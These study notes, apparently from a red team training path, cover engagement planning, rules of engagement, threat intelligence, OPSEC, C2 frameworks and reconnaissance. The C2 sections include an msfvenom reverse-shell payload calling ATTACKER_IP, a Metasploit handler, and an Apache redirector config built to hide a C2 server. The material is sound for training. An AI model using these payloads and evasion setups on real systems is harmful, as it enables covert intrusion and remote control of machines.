# Red Team Fundamentals

## Red Team Engagements

### --------------------------------- Defining Scope and Objectives -----------------------------------

**Objectives:** What the client wants to achieve (find weaknesses, test EDR, SIEM, detection, response, and data exposure).

**Penetration Test:** General security testing using standard TTPs (TTPs describe how an attacker performs an attack. TTP = Tactics, Techniques, and Procedures.) .

**Adversary Emulation:** Imitating the real-world attack methods of a specific threat actor (hacker group) to test an organization's security.

**Scope:** Defines what you can and cannot attack. Only the client sets it.

**Scope examples:** Allowed/forbidden IPs, no downtime, no DDoS, no harmful malware, no PII exfiltration.

**White Card:** Permission to use information or assistance from the client during an exercise.

**Engagement Plan:** Detailed plan explaining how to achieve objectives while following the scope.

**Remember:** Objectives = WHAT to achieve. Scope = WHAT is allowed. Plan = HOW to achieve it.


### --------------------------------- Rules of Engagement -----------------------------------

**Rules of Engagement (RoE):** A legally binding agreement between the client and Red Team defining objectives, scope, permissions, restrictions, and expectations.

**NDA:** Non-Disclosure Agreement – keeps confidential information private.

**Main RoE Sections:**

| Section                  | Purpose                          |
| ------------------------ | -------------------------------- |
| Executive Summary        | Overall summary                  |
| Purpose                  | Why RoE exists                   |
| References               | Related standards (HIPAA, ISO)   |
| Scope                    | Allowed and forbidden activities |
| Definitions              | Technical term meanings          |
| Rules & Support          | Both parties' responsibilities   |
| Provisions               | Exceptions and extra conditions  |
| Requirements & Authority | Red Team's permissions           |
| Ground Rules             | Interaction limitations          |
| Points of Contact        | Important contacts               |
| Authorization            | Official permission              |
| Approval                 | Both parties' signatures         |
| Appendix                 | Additional information           |

**Remember:** RoE is the official legal permission and rulebook for a Red Team engagement. It is only a summary; detailed engagement planning comes later.

**Reference:** [Red Team RoE Template](https://redteam.guide/docs/templates/roe_template/?utm_source=chatgpt.com)


### --------------------------------- Campaign Planning -----------------------------------

**Campaign Planning:** Uses client objectives and RoE to decide what the Red Team will do and how they will do it.

**Four Campaign Plans:**

| Plan             | Main Purpose                                                           |
| ---------------- | ---------------------------------------------------------------------- |
| Engagement Plan  | Overall technical plan (CONOPS, resources, personnel, timeline)        |
| Operations Plan  | Detailed execution planning (operators, information, responsibilities) |
| Mission Plan     | Exact commands, execution time, responsible operator                   |
| Remediation Plan | Post-campaign actions (report, remediation consultation)               |

**References:**

[Red Team Guide](http://redteam.guide/?utm_source=chatgpt.com)

[Red Team Engagement Checklist](https://redteam.guide/docs/checklists/red-team-checklist/?utm_source=chatgpt.com)

**Remember:** Engagement = Overall plan. Operations = Detailed plan. Mission = Exact execution. Remediation = After the campaign.


### --------------------------------- Engagement Documentation -----------------------------------

**Engagement Documentation:** Officially records campaign planning. It can be a formal document or even a simple email.

#### **Engagement Plan**

| Component     | Purpose                                                     |
| ------------- | ----------------------------------------------------------- |
| CONOPS        | Non-technical overview of how Red Team achieves objectives. |
| Resource Plan | Timeline, personnel, hardware, cloud requirements.          |

#### **Operations Plan**

| Component              | Purpose                              |
| ---------------------- | ------------------------------------ |
| Personnel              | Required employees.                  |
| Stopping Conditions    | When and why to stop the engagement. |
| RoE (Optional)         | Rules of Engagement.                 |
| Technical Requirements | Knowledge needed by Red Team.        |

#### **Mission Plan**

| Component                    | Purpose                                   |
| ---------------------------- | ----------------------------------------- |
| Command Playbooks (Optional) | Exact commands, tools, when, why and how. |
| Execution Times              | When to start each stage.                 |
| Responsibilities/Roles       | Who does what and when.                   |

#### **Remediation Plan (Optional)**

| Component                | Purpose                                 |
| ------------------------ | --------------------------------------- |
| Report                   | Engagement summary and findings.        |
| Remediation/Consultation | How the client fixes discovered issues. |

**Remember:** Engagement = Overview. Operations = Preparation. Mission = Execution. Remediation = Reporting and fixing issues.


### --------------------------------- Concept of Operations -----------------------------------

**CONOPS (Concept of Operations):** A high-level, semi-technical overview of how the Red Team will conduct the engagement. Written so even non-technical clients can understand it.

**Main Components:**

| Component           | Meaning                         |
| ------------------- | ------------------------------- |
| Client Name         | Who hired the Red Team          |
| Service Provider    | Who performs the test           |
| Timeframe           | How long it takes               |
| Objectives/Phases   | Goals and major stages          |
| Training Objectives | What security abilities to test |
| Tools/Techniques    | Planned tools and TTPs          |
| Threat Group        | APT/group to imitate, if any    |


### --------------------------------- Resource Plan -----------------------------------

**Resource Plan:** Extends CONOPS with specific dates, required knowledge, and resources needed for the engagement.

**Main Components:**

| Component                     | Purpose                                                         |
| ----------------------------- | --------------------------------------------------------------- |
| Header                        | Writer, dates, customer                                         |
| Engagement Dates              | Recon, initial compromise, post-exploitation, persistence dates |
| Knowledge Required (Optional) | Skills needed for each attack phase                             |
| Resource Requirements         | Personnel, hardware, cloud, and other resources                 |

**Remember:** CONOPS = Overall overview. Resource Plan = What resources, skills, and dates are needed.


### --------------------------------- Operations Plan -----------------------------------

**Operations Plan:** Expands CONOPS with specific engagement details and planned actions.

**Main Components:**

| Component           | Purpose                                               |
| ------------------- | ----------------------------------------------------- |
| Header              | Writer, dates, customer                               |
| Stopping Conditions | When and why to stop the engagement                   |
| Personnel           | Assigned team members                                 |
| TTPs and Attacks    | Planned attack techniques                             |
| Communications Plan | How Red Team communicates with other teams and client |
| RoE (Optional)      | Rules of Engagement                                   |

**Communication Tools:**

[VECTR](http://vectr.io/?utm_source=chatgpt.com)

Email

Slack

**Remember:** Operations Plan = Who will do what, which attacks will be used, when to stop, and how everyone communicates.


### --------------------------------- Mission Plan -----------------------------------

**Mission Plan:** Cell-specific document that assigns exact actions to Red Team operators.

**Main Components:**

| Component                 | Purpose                            |
| ------------------------- | ---------------------------------- |
| Objectives                | What needs to be achieved          |
| Operators                 | Who performs the tasks             |
| Exploits/Attacks          | Attacks to execute                 |
| Targets                   | Users, machines, systems           |
| Execution Plan Variations | Alternative ways to complete tasks |

**Remember:**

Operations Plan = Business/client perspective (overall operations).

Mission Plan = Operator perspective (exact actions to perform).


### --------------------------------- Mission Plan -----------------------------------

**Mission Plan:** Cell-specific document that assigns exact actions to Red Team operators.

**Main Components:**

| Component                 | Purpose                            |
| ------------------------- | ---------------------------------- |
| Objectives                | What needs to be achieved          |
| Operators                 | Who performs the tasks             |
| Exploits/Attacks          | Attacks to execute                 |
| Targets                   | Users, machines, systems           |
| Execution Plan Variations | Alternative ways to complete tasks |

**Remember:**

Operations Plan = Business/client perspective (overall operations).

Mission Plan = Operator perspective (exact actions to perform).




## Red Team Threat Intel

### --------------------------------- What is Threat Intelligence -----------------------------------

**Threat Intelligence (CTI):** Collecting and analyzing information about attackers to understand their activities and techniques.

**IOC (Indicators of Compromise):** Traces left by attackers, such as IPs, domains, files, and strings.

**ISAC:** Information Sharing and Analysis Center – shares threat intelligence like IOCs and TTPs.


### --------------------------------- Applying Threat Intel to the Red Team -----------------------------------

**Red Team uses CTI:** To study real attackers and imitate their behavior during adversary emulation.

**Main Frameworks:**

| Framework    | Purpose                                      |
| ------------ | -------------------------------------------- |
| MITRE ATT&CK | Collects and categorizes known TTPs          |
| TIBER-EU     | Framework for threat-led penetration testing |
| OST Map      | Threat intelligence mapping framework        |

**TTPs are categorized by:** Threat Group, Kill Chain Phase, Tactic, and Objective/Goal.

**Process:** Select a target APT → Collect its TTPs → Map them to the Cyber Kill Chain → Build tools and modify attack behavior to imitate that APT.

**Remember:** Red Team uses CTI, IOCs, and TTPs to plan and perform realistic adversary emulation.


### --------------------------------- The TIBER-EU Framework -----------------------------------

**TIBER-EU:** Threat Intelligence-Based Ethical Red Teaming. A framework developed by the European Central Bank (ECB).

**Purpose:** Helps financial institutions test and improve their security against sophisticated cyberattacks using threat intelligence.

**Key Difference:** Its Testing phase uses threat intelligence to guide Red Team attacks.

**Remember:** TIBER-EU = A best-practice framework that uses real-world threat intelligence to make Red Team testing realistic.

**References:**

[ECB TIBER-EU White Paper (PDF)](https://www.ecb.europa.eu/pub/pdf/other/ecb.tiber_eu_framework.en.pdf?utm_source=chatgpt.com)

[CREST TIBER-EU](https://www.crest-approved.org/membership/tiber-eu/?utm_source=chatgpt.com)


### --------------------------------- TTP Mapping -----------------------------------

**TTP Mapping:** Mapping an attacker's techniques to a standard Cyber Kill Chain to plan realistic adversary emulation.

**Target APT Selection:** Based on target industry, attack vectors, country of origin, and other factors.

**Example:** APT39 (Iranian cyber-espionage group).

**MITRE ATT&CK:** Provides IDs and descriptions of an attacker's known TTPs.

**ATT&CK Navigator:** Visualizes an APT group's TTPs and helps map them to the Kill Chain.

**APT39 TTP Mapping:**

| Kill Chain Phase      | TTPs                                                                   |
| --------------------- | ---------------------------------------------------------------------- |
| Reconnaissance        | Internal team methodology                                              |
| Weaponization         | PowerShell, Python, VBA, malicious attachments                         |
| Delivery              | Public-facing application exploits, spearphishing                      |
| Exploitation          | Registry modification, scheduled tasks, keylogging, credential dumping |
| Installation          | Ingress tool transfer, proxy usage                                     |
| Command & Control     | HTTP/HTTPS, DNS                                                        |
| Actions on Objectives | Exfiltration over C2                                                   |

**Other TTP Platforms:**

[MITRE ATT&CK](https://attack.mitre.org/?utm_source=chatgpt.com)

[ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/?utm_source=chatgpt.com)

[APT39 Profile](https://attack.mitre.org/groups/G0087/?utm_source=chatgpt.com)

[TryHackMe MITRE Room](https://tryhackme.com/room/mitre?utm_source=chatgpt.com)

[OST Map](https://github.com/intezer/ost-map?utm_source=chatgpt.com)

Mandiant Advantage, Ontic, CrowdStrike Falcon.

**Remember:** Select APT → Collect its TTPs → Use MITRE ATT&CK Navigator → Map TTPs to the Cyber Kill Chain → Plan adversary emulation.


### --------------------------------- Other Red Team Applications of CTI -----------------------------------

**CTI During Engagement:** Red Team uses CTI to imitate an attacker's actual behavior, not just their TTPs.

**Two Main Uses:**

**1. C2 Traffic Manipulation:** Make Command & Control traffic look like the targeted APT's traffic.

Important details: User-Agent, Ports, Protocols, Listener Profiles, Host Headers, POST URIs, Server Responses and Headers.

**Malleable C2 Profile:** Controls how C2 listener traffic looks and behaves.

[ Cobalt Strike Malleable C2](https://www.cobaltstrike.com/help-malleable-c2?utm_source=chatgpt.com)

**2. Malware & Tooling Emulation:** Study an attacker's malware and create tools with similar behavior.

Analyze: Traffic, System calls (syscalls), API calls, Dropper behavior, File signatures and IOCs.

**Remember:** CTI helps Red Team imitate both the attacker's network traffic and malware behavior to make adversary emulation realistic.




## Red Team OPSEC

### --------------------------------- Introduction -----------------------------------

**OPSEC (Operations Security):** A process of protecting information about Red Team activities so adversaries (Blue Team and third parties) cannot discover their capabilities and intentions.

<img width="920" height="560" alt="image" src="https://github.com/user-attachments/assets/eb275ff0-8fac-4436-9744-3766de520ba1" />

**Purpose:** Prevent the Blue Team from connecting activities and identifying the Red Team.

**Five OPSEC Steps:**

1. Identify critical information.
2. Analyse threats.
3. Analyse vulnerabilities.
4. Assess risks.
5. Apply appropriate countermeasures.

<img width="920" height="300" alt="image" src="https://github.com/user-attachments/assets/606fe627-0f64-4e2e-9cc5-957baaf6b7e7" />


**Example:** If you scan a target using your IP and host a phishing site using the same IP, the Blue Team can connect both activities and identify you.

**Frameworks:**

[ NIST OPSEC Definition](https://csrc.nist.gov/glossary/term/opsec?utm_source=chatgpt.com)

[Lockheed Martin Cyber Kill Chain](https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html?utm_source=chatgpt.com)

[MITRE ATT&CK](https://attack.mitre.org/?utm_source=chatgpt.com)


### --------------------------------- Critical Information Identification -----------------------------------

**Critical Information:** Any information that, if discovered by the Blue Team, could weaken or expose the Red Team's operation.

**Examples:**

1. **Client Information:** Employee names, roles, and infrastructure.
2. **Red Team Information:** Identities, activities, plans, capabilities, limitations.
3. **TTPs:** Techniques used to imitate attackers.
4. **Tools & Environment:** OS, cloud provider, C2 framework (e.g., Pentoo).
5. **Public IP Addresses:** Blue Team could block them.
6. **Domain Names:** Blue Team could block or sinkhole them.
7. **Hosted Websites:** Phishing websites used during emulation.

**PoLP (Principle of Least Privilege):** Everyone should access only the information necessary for their job.

**Reference:** [Pentoo](https://pentoo.github.io/?utm_source=chatgpt.com)

**Remember:** Critical Information = Anything that could help the Blue Team discover, prepare for, or stop your operation.


### --------------------------------- Threat Analysis -----------------------------------

**Threat Analysis:** Identifying potential adversaries, their intentions, and capabilities.

**Four Questions:**

1. Who is the adversary?
2. What are their goals?
3. What TTPs do they use?
4. What critical information have they obtained?

**Potential Adversaries:**

| Adversary             | Intention          | Capability       |
| --------------------- | ------------------ | ---------------- |
| Blue Team             | Keep intruders out | Not always known |
| Malicious third party | Varies             | Varies           |

**Threat Formula:**

```
Threat = Adversary + Intent + Capability
```

**Remember:** Someone is a threat only if they have both the intention and capability to prevent your operation from succeeding.

**Reference:** [DoD OPSEC Program Manual (PDF)](https://www.esd.whs.mil/Portals/54/Documents/DD/issuances/dodm/520502m.pdf?utm_source=chatgpt.com)


### --------------------------------- Vulnerability Analysis -----------------------------------

**OPSEC Vulnerability:** A weakness that allows an adversary to discover critical information, analyse it, and disrupt your operation.

**Examples:**

1\. **Same IP Address:** Using one IP for Nmap, phishing, and Metasploit. If Blue Team blocks that IP, all activities fail.

2\. **Unsecured Database:** Attackers may steal phishing victim credentials and compromise the client's network.

3\. **Social Media Leak:** Revealing the client's name can help Blue Team prepare for the Red Team's activities.

**Remember:** OPSEC Vulnerability = A weakness that exposes your critical information and allows adversaries to disrupt your operation.


### --------------------------------- Risk Assessment -----------------------------------

**Risk Assessment:** Evaluating the possibility of an OPSEC vulnerability being exploited and its expected impact/cost.

**Three Factors for Countermeasures:**

1. How effectively will it reduce risk?
2. Is its cost reasonable compared to the potential damage?
3. Could the countermeasure reveal information to the adversary?

**Examples:**

**Same IP for Nmap, Metasploit & Phishing:**

SIEM available → Easier to detect and connect activities → High risk.

Weak monitoring → Harder to detect → Low risk.

**Unsecured Database:**

Malicious bots continuously scan random public IPs. An unsecured database can eventually be discovered and compromised.

**SIEM:** Security Information and Event Management – Monitors and analyses security events from different sources in real time.

**Reference:** [NIST Risk Assessment](https://csrc.nist.gov/glossary/term/risk_assessment?utm_source=chatgpt.com)

**Remember:** Risk Assessment = How likely a vulnerability is to be exploited + How much damage it can cause.


### --------------------------------- Countermeasures -----------------------------------

**Countermeasures:** Actions taken to protect critical information and reduce OPSEC risks.

**Examples:**

1. **Separate IPs:** Use different public IPs for scanning, phishing, and exploitation.
2. **Rename VMs/Hosts:** Use names that blend with the client's environment.
3. **User-Agent:** Use a common User-Agent instead of default tool values.
4. **Secure Database:** Allow access only to authorized personnel.
5. **Client Privacy:** Never expose client names on public channels.

**Three Purposes of Countermeasures:**

Prevent adversaries from detecting critical information, provide alternative interpretations (deception), or block adversary information collection.

**Reference:** [DoD OPSEC Program Manual (PDF)](https://www.esd.whs.mil/Portals/54/Documents/DD/issuances/dodm/520502m.pdf?utm_source=chatgpt.com)

**Remember – Five OPSEC Steps:**

Identify → Analyse Threats → Analyse Vulnerabilities → Assess Risks → Apply Countermeasures.




## Intro to C2

### --------------------------------- Command and Control Framework Structure -----------------------------------

**C2 Framework:** A system that allows an operator to control multiple compromised machines through a central server. Its biggest advantage over Netcat is its advanced post-exploitation features.

<img width="632" height="481" alt="image" src="https://github.com/user-attachments/assets/5dcb2718-264d-45f9-81ed-b45c41075f63" />

<img width="791" height="672" alt="image" src="https://github.com/user-attachments/assets/77c09a1a-5efe-4d2f-a4b6-4c82d018f6fe" />


#### **Main Components**

| Component                 | Meaning                                                                      |
| ------------------------- | ---------------------------------------------------------------------------- |
| C2 Server                 | Central server that receives agent connections and sends commands.           |
| Agent/Payload             | Program running on the compromised machine that connects to C2.              |
| Listener                  | Waits for agent connections on a port/protocol (HTTP, HTTPS, DNS).           |
| Beacon                    | Agent's callback to the C2 server.                                           |
| Modules                   | Add extra functionality to the C2 framework.                                 |
| Post-Exploitation Modules | Activities after initial compromise.                                         |
| Pivoting Modules          | Help access restricted network segments through another compromised machine. |

#### **Beacon Obfuscation**

**Sleep Timer:** Time an agent waits between callbacks.

Example: Beacon every 5 seconds = 5-second sleep timer.

**Jitter:** Adds random variation to the sleep timer to avoid predictable callback patterns.

Example:

```
import randomsleep = 60jitter = random.randint(-30,30)sleep = sleep + jitter
```

#### **Payload Types**

| Type      | Meaning                                                                 |
| --------- | ----------------------------------------------------------------------- |
| Stageless | Contains the complete agent. Executes and starts beaconing immediately. |
| Staged    | Small dropper downloads the remaining agent (Stage 2) from C2.          |

<img width="632" height="201" alt="image" src="https://github.com/user-attachments/assets/de93a779-c5f1-4770-a31b-588b1a994e4b" />

**Staged Payload Flow:**

Dropper executes → Calls C2 → Downloads Stage 2 → Loads into memory → Starts beaconing.

<img width="932" height="425" alt="image" src="https://github.com/user-attachments/assets/6c218b1c-5eab-44a6-b24d-b57bd4c854be" />

**Payload Formats:**

PE/EXE, PowerShell, HTA, JScript, VBA scripts, Microsoft Office Documents.

#### **Modules**

**Post-Exploitation:** Used for activities after initial access, e.g. SharpHound and LSASS credential analysis.

**Pivoting:** Allows restricted machines to communicate through another compromised machine, e.g. SMB Beacon using an SMB named pipe.

<img width="961" height="521" alt="image" src="https://github.com/user-attachments/assets/e4b13754-63f1-4208-81e1-b725e1e746ff" />

#### **Facing the World**

**Domain Fronting:** Uses a trusted provider (e.g. Cloudflare) as a proxy so C2 traffic appears to communicate with a trusted infrastructure.

<img width="864" height="534" alt="image" src="https://github.com/user-attachments/assets/ff3cfa97-2a24-4fcb-ab4e-293bd229a8da" />

**C2 Profiles:** Control how HTTP requests and responses look and behave.

<img width="1326" height="681" alt="image" src="https://github.com/user-attachments/assets/9b9eb6ec-f9c0-43dc-aa7a-cd2325f66b74" />

Example: A custom HTTP header such as `X-C2-Server` helps the C2 server distinguish agent requests from normal browser requests.

**Redirectors:** Intermediate infrastructure that forwards traffic between agents and the C2 server.

#### **Important Terms to Remember**

| Term            | Remember                                               |
| --------------- | ------------------------------------------------------ |
| C2 Server       | Central control server                                 |
| Agent           | Runs on compromised machine                            |
| Listener        | Waits for connections                                  |
| Beacon          | Agent callback                                         |
| Sleep           | Delay between callbacks                                |
| Jitter          | Random delay variation                                 |
| Stageless       | Complete payload                                       |
| Staged          | Downloads second stage                                 |
| Modules         | Extra functionality                                    |
| Pivoting        | Access restricted networks                             |
| Domain Fronting | Hides actual destination behind trusted infrastructure |
| C2 Profile      | Controls traffic appearance                            |

**Remember:** C2 Server = Control center, Agent = Controlled machine, Listener = Waiting for connections, Beacon = Callback, Modules = Extra capabilities.


### --------------------------------- Common C2 Frameworks -----------------------------------

## **Common C2 Frameworks**

#### **Free C2 Frameworks**

| Framework                          | Key points                                                                                                                                                        |
| ---------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Metasploit**                     | Developed by Rapid7. Popular exploitation and post-exploitation framework.                                                                                        |
| **Armitage**                       | Metasploit GUI extension written in Java. Provides target enumeration and visualization. **Hail Mary** attempts all exploits against a target's running services. |
| **PowerShell Empire / Starkiller** | Empire supports agents written in different languages and multiple platforms. Starkiller provides a GUI. Maintained by BC Security.                               |
| **Covenant**                       | Written in C#. Focuses on post-exploitation and lateral movement. Supports HTTP, HTTPS and SMB listeners with customizable agents.                                |
| **Sliver**                         | Developed by Bishop Fox; written in Go. Multi-user, customizable CLI-based C2. Supports WireGuard, mTLS, HTTP(S), DNS and BOF files.                              |

#### **Paid C2 Frameworks**

| Framework            | Key points                                                                                                                                  |
| -------------------- | ------------------------------------------------------------------------------------------------------------------------------------------- |
| **Cobalt Strike**    | Originally created by Raphael Mudge. Java-based C2 for Red Team operations. Supports advanced features, including VPN tunnels from beacons. |
| **Brute Ratel (C4)** | Created by Chetan Nayak (Paranoid Ninja). Customizable Command and Control Center for adversary simulation.                                 |

#### **Important Concepts**

- **Paid C2:** Often offers advanced post-exploitation, pivoting and custom features. May be harder for AV to detect, but is not undetectable.
- **Open-source C2:** Generally better understood, making signature-based detection easier to develop.
- **C2 Matrix:** Comprehensive list comparing C2 frameworks and their capabilities.

**Useful links:**

- [Metasploit](https://www.metasploit.com/?utm_source=chatgpt.com)
- [PowerShell Empire](https://bc-security.gitbook.io/empire-wiki/?utm_source=chatgpt.com)
- [Starkiller](https://github.com/BC-SECURITY/Starkiller?utm_source=chatgpt.com)
- [Covenant](https://github.com/cobbr/Covenant?utm_source=chatgpt.com)
- [Sliver](https://github.com/BishopFox/sliver?utm_source=chatgpt.com)
- [Cobalt Strike](https://www.cobaltstrike.com/?utm_source=chatgpt.com)
- [Brute Ratel](https://bruteratel.com/?utm_source=chatgpt.com)
- [C2 Matrix](https://howto.thec2matrix.com/?utm_source=chatgpt.com)

**Remember:** Free = Metasploit, Armitage, Empire/Starkiller, Covenant, Sliver. Paid = Cobalt Strike, Brute Ratel.


### --------------------------------- Setting Up a C2 Framework -----------------------------------

**Build:**

```
git clone https://gitlab.com/kalilinux/packages/armitage.git && cd armitage
bash package.sh
cd ./release/unix/
ls -la
```

Build output: `BUILD SUCCESSFUL`

**Important files:**

- `teamserver` – Starts C2 server; requires IP and shared password.
- `armitage` – Client used by operators to connect.

**PostgreSQL & Metasploit DB:**

```
systemctl start postgresql && systemctl status postgresql
export MSF_DATABASE_CONFIG=/root/.msf4/database.yml
```

**Start Teamserver:**

```
./teamserver YourIP P@ssw0rd123
```

**Start Client:**

```
./armitage
```

**Important technical details:**

| Port / Setting  | Purpose                                               |
| --------------- | ----------------------------------------------------- |
| `55553`         | Armitage Teamserver                                   |
| `55554`         | Metasploit RPC                                        |
| `127.0.0.1`     | Localhost; Armitage does not allow it as listening IP |
| `tun0` / `eth0` | Use the appropriate interface IP                      |

**Security:** Never expose the C2 management interface publicly. Give operators separate accounts and use SSH port forwarding to access TCP `55553`.

**Remember:** PostgreSQL + Metasploit DB are required. `teamserver` starts the server; `armitage` connects the client.


### --------------------------------- C2 Operation Basics -----------------------------------

#### **C2 Operation Basics**

**C2 Server:** Used to control compromised machines remotely.

**OPSEC:** Never expose the C2 management interface publicly. Attackers/defenders can fingerprint it (e.g., Cobalt Strike before v3.13 had an extra HTTP space `\x20`).

**Protection:** Use SSH port forwarding, firewall rules, Security Groups, UFW, or IPTables.

#### **SSH Port Forwarding**

Access a remote C2 server securely through SSH (TCP/22), even when its management port is blocked.

```
ssh -L 55553:127.0.0.1:55553 root@192.168.0.44
```

Local port `55553` → Remote C2 port `55553`.

**Note:** Armitage cannot listen on loopback (`127.0.0.1-127.255.255.255`).

#### **Armitage Listener**

**Listener:** Waits for a connection from a target.

**Bind:** You connect to the target.

**Reverse:** Target connects back to you.

**Shell:** Basic reverse shell.

**Meterpreter:** Advanced Metasploit shell.

Armitage → Listeners → Reverse → Meterpreter → Port `31337`.

#### **MSFvenom Payload**

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=31337 -f exe -o shell.exe
```

`LHOST` = Attacker IP, `LPORT` = Listener port, `-f exe` = EXE format, `-o` = Output file.

Running `shell.exe` on the lab target sends a callback to the listener.

#### **Listener Types**

| Type               | Main concept                                       |
| ------------------ | -------------------------------------------------- |
| Standard (TCP/UDP) | Direct communication, often cleartext              |
| HTTP/HTTPS         | Uses web traffic; HTTPS can blend in               |
| DNS                | Uses DNS; useful for proxy bypass and exfiltration |
| SMB                | Uses named pipes; useful for internal pivoting     |

**Remember:** DNS C2 often needs a domain and public NS server. SMB allows multiple machines to communicate while only one connects outward.

Metasploit supports TCP/UDP, HTTP/HTTPS, and SMB named pipes. DNS C2 may require extra tools.

[TASK 6 - LABS](https://medium.com/@DaRkrAi69/intro-to-c2-c66fe9e9b083)

### --------------------------------- Advanced C2 Setups -----------------------------------

**Problem with Metasploit:** Limited C2 features. No configurable beacon interval or jitter, making traffic easy to detect by NGFW.

#### **C2 Redirector**

**Redirector:** A middle server that forwards HTTP/HTTPS requests to the real C2 server based on request information (e.g., User-Agent).

**Purpose:** Hide the real C2 server. If the redirector gets reported, the actual C2 server stays protected.

**Common tools:** Apache2, NGINX, Load Balancer.

**Important:** Firewall should only allow the redirector to communicate with the real C2 server.

#### **Apache2 Setup**

Required modules:

`rewrite`, `proxy`, `proxy_http`, `headers`

Install and enable:

```
apt install apache2

a2enmod rewrite && a2enmod proxy && a2enmod proxy_http && a2enmod headers && systemctl start apache2 && systemctl status apache2
```

**Note:** AttackBox already uses port 80. Change Apache's port in `/etc/apache2/ports.conf` before starting it.

#### **Modified HTTP User-Agent**

User-Agent is an HTTP header that identifies the client. It can be modified to help identify which requests should be forwarded.

Generate payload:

```
msfvenom -p windows/meterpreter/reverse_http LHOST=tun0 LPORT=80 HttpUserAgent=NotMeterpreter -f exe -o shell.exe
```

Wireshark HTTP filter: `http`

#### **Apache Redirector Configuration**

Config file:

`/etc/apache2/sites-available/000-default.conf`

Important directives:

| Directive          | Meaning                            |
| ------------------ | ---------------------------------- |
| `RewriteEngine On` | Enable rewrite rules               |
| `RewriteCond`      | Check HTTP request conditions      |
| `ProxyPass`        | Forward requests to another server |

Example configuration:

```
<VirtualHost *:80>

    ServerAdmin webmaster@localhost
    DocumentRoot /var/www/html

    RewriteEngine On
    RewriteCond %{HTTP_USER_AGENT} "^NotMeterpreter$"
    ProxyPass "/" "http://localhost:8080/"

    <Directory>
        AllowOverride All
    </Directory>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>
```

`^` = Beginning of string.

`$` = End of string.

`^NotMeterpreter$` = Matches only the exact User-Agent `NotMeterpreter`.

Reference: [Apache mod_rewrite documentation](https://httpd.apache.org/docs/2.4/mod/mod_rewrite.html?utm_source=chatgpt.com)

#### **Metasploit Redirector Configuration**

```
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_http
set LHOST 127.0.0.1
set LPORT 8080
set ReverseListenerBindAddress 127.0.0.1
set ReverseListenerBindPort 8080
set OverrideLHOST 192.168.0.44
set OverrideLPORT 80
set HttpUserAgent NotMeterpreter
set OverrideRequestHost true
run
```

| Option                       | Meaning                                      |
| ---------------------------- | -------------------------------------------- |
| `LHOST`                      | Internal C2 listening IP                     |
| `LPORT`                      | Internal C2 listening port                   |
| `ReverseListenerBindAddress` | Address where handler listens                |
| `ReverseListenerBindPort`    | Handler listening port                       |
| `OverrideLHOST`              | Redirector IP/domain                         |
| `OverrideLPORT`              | Redirector port                              |
| `HttpUserAgent`              | Expected User-Agent                          |
| `OverrideRequestHost`        | Makes payload communicate through redirector |

#### **Remember**

**Communication flow:**

`Victim → Redirector (Apache2) → C2 Server (Metasploit)`

Use multiple redirectors and DNS records in real engagements instead of relying on IP addresses alone.


## Red Team Recon

### --------------------------------- Built-in Tools -----------------------------------

whois, dig, nslookup, host, traceroute

### --------------------------------- Advanced Searching -----------------------------------

Google Dorking , Google Hacking Database, Social Media Osint, Job Ads OSINT, Wayback Machine

**Useful Links**
[Google Advanced Search](https://www.google.com/advanced_search?utm_source=chatgpt.com), [Google Search Operators](https://support.google.com/websearch/answer/2466433?utm_source=chatgpt.com), [DuckDuckGo Syntax](https://help.duckduckgo.com/duckduckgo-help-pages/results/syntax/?utm_source=chatgpt.com), [Bing Advanced Search](https://help.bing.microsoft.com/apex/index/18/en-US/10002?utm_source=chatgpt.com)


### --------------------------------- Specialized Search Engines -----------------------------------

#### **Specialized Search Engines**

| Tool                                                                                           | Purpose                                           |
| ---------------------------------------------------------------------------------------------- | ------------------------------------------------- |
| [ViewDNS](https://viewdns.info/?utm_source=chatgpt.com)                                        | Reverse IP Lookup: find domains sharing an IP.    |
| [Threat Intelligence Platform](https://threatintelligenceplatform.com/?utm_source=chatgpt.com) | WHOIS, DNS, malware checks, NS records.           |
| [Censys](https://search.censys.io?utm_source=chatgpt.com)                                      | Find IP/domain information, open ports, services. |
| [Shodan](https://www.shodan.io/?utm_source=chatgpt.com)                                        | Find exposed devices, services and open ports.    |

#### **Important Concepts**

**WHOIS History:** Shows previous domain registration information.

**Reverse IP Lookup:** Finds multiple domains hosted on the same IP (Shared Hosting).

**Censys:** Helps identify whether an IP belongs to your target or a third party (e.g., Cloudflare).

#### **Shodan CLI**

```
shodan init API_KEY
shodan host IP_ADDRESS
shodan myip
```

Links: [Shodan CLI](https://cli.shodan.io/?utm_source=chatgpt.com) | [Account Plans](https://account.shodan.io/billing?utm_source=chatgpt.com) | [THM Passive Recon](https://tryhackme.com/room/passiverecon?utm_source=chatgpt.com)

**Remember:** Never scan third-party systems outside your authorized scope.


### --------------------------------- Recon-ng -----------------------------------


**Recon-ng:** OSINT automation framework. Collects domains, subdomains, hosts, emails, etc. Saves results in a workspace database.

#### **Workflow**

`Create Workspace → Insert Data → Search → Install → Load → Run`

#### **Commands**

```
recon-ng
recon-ng -w WORKSPACE_NAME
```

```
recon-ng
#osint framework

workspaces create thmredteam
#create new workspace for investigation

db schema
#check table names in database

db insert domains
#insert domain name into domains table
#enter domain name on prompt

marketplace search virustotal
#search for modules containing 'virustotal'

marketplace search
#list of all modules

marketplace search domains-

marketplace info google_site_web
#view info about module

marketplace install google_site_web
#installs module

modules search
#view all installed modules

modules load viewdns_reverse_whois
#load module

options list
#view options

options set Name thmredteam.com
#set option value

run
#run the module

exit
```

#### **API Keys**

Some modules need API keys (`K` = Key required). Dependencies (`D`) = Extra libraries needed.

```
keys list
keys add KEY_NAME KEY_VALUE
keys remove KEY_NAME
```

#### **Important**

`CTRL + C` = Unload module.

`info` = Module information.

`options list` = Available settings.

`options set NAME VALUE` = Set option.

`run` = Execute module.

**Remember:** Install → Load → Run. A module cannot run before installation and loading. Database data can be reused by other modules.


### --------------------------------- Maltego -----------------------------------

#### **Maltego**

[Maltego](https://www.maltego.com/?utm_source=chatgpt.com) – OSINT tool that visually maps relationships between domains, IPs, people, emails, companies, etc.

**Entity:** An item in the graph (e.g., domain, IP, email).

**Transform:** Code/API query that takes an entity and finds related entities.

#### **Example Workflow**

